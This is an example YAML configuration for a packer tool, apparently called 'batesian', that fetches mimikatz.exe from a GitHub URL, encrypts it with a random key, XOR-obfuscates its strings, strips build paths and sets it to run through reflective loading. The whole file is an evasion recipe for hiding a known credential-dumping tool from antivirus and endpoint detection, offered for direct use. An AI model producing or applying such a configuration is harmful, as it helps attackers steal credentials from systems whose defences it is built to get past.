# Example configuration to pack mimikatz.exe.
# Usage: batesian build examples/configs/mimikatz.yaml

schema: 2
name: mimikatz-basic

build:
  payload:
    source: "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
    crypto:
      algo: xchacha20poly1305
      key: random
  strings:
    strategy: xor
  output:
    path: ./dist/mimikatz_packed.exe
    arch: x64
    strip: true
    trim_paths: all

runtime:

  - technique: reflective_loading
